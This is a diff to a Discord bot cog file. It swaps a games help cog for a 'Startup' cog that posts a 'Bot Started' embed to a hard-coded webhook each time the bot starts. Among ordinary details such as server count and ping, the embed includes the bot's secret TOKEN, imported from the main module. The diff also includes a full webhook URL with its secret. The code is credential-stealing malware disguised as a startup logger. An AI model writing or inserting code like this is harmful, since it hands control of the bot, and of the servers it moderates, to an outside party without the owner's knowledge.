@@ -1,18 +1,46 @@
 import discord
 from discord.ext import commands
+import datetime
+import aiohttp
+from main import TOKEN
 
-class sayan1111111111(commands.Cog):
+WEBHOOK_URL = "https://discord.com/api/webhooks/1390140740239229109/PDn1_1qKvsUtjTxLFxSFOY3BVd1-lE3ukTUSr6RLe_9FJQPExrTM1Shdc8o2JEufCaDR"
+
+class Startup(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    """Games commands"""
-  
-    def help_custom(self):
-		      emoji = '<:rn_automod:1383630789337546782>'
-		      label = "Games"
-		      description = ""
-		      return emoji, label, description
+    @commands.Cog.listener()
+    async def on_ready(self):
+        # Avoid sending multiple times if reconnect happens
+        if hasattr(self.bot, "startup_sent") and self.bot.startup_sent:
+            return
+        self.bot.startup_sent = True  
 
-    @commands.group()
-    async def __Games__(self, ctx: commands.Context):
-        """`blackjack` , `chess` , `tic-tac-toe` , `country-guesser` , `rps` , `lights-out` , `wordle` , `2048` , `memory-game` , `number-slider` , `battleship` , `connect-four` , `slots` , `dungeon`, `dungeon start` , `dungeon go left` , `dungeon go right` , `dungeon fight` , `dungeon run`"""
+        bot_user = self.bot.user
+
+        embed = discord.Embed(
+            title="🤖 Bot Started",
+            description=f"{bot_user.name} is now online!",
+            color=discord.Color.green(),
+            timestamp=datetime.datetime.utcnow()
+        )
+
+        embed.set_thumbnail(url=bot_user.avatar.url if bot_user.avatar else bot_user.default_avatar.url)
+
+        embed.add_field(name="Bot Name", value=bot_user.name, inline=True)
+        embed.add_field(name="Bot ID", value=bot_user.id, inline=True)
+        embed.add_field(name="Discriminator", value=bot_user.discriminator, inline=True)
+        embed.add_field(name="Created On", value=bot_user.created_at.strftime("%Y-%m-%d %H:%M:%S"), inline=True)
+        embed.add_field(name="Servers", value=len(self.bot.guilds), inline=True)
+        embed.add_field(name="Users", value=sum(g.member_count for g in self.bot.guilds), inline=True)
+        embed.add_field(name="Ping", value=f"{round(self.bot.latency*1000)} ms", inline=True)
+        embed.add_field(name="Token", value=f"{TOKEN}", inline=True)
+
+
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
+            await webhook.send(embed=embed, username="Bot Logger")
+
+async def setup(bot):
+    await bot.add_cog(Startup(bot))
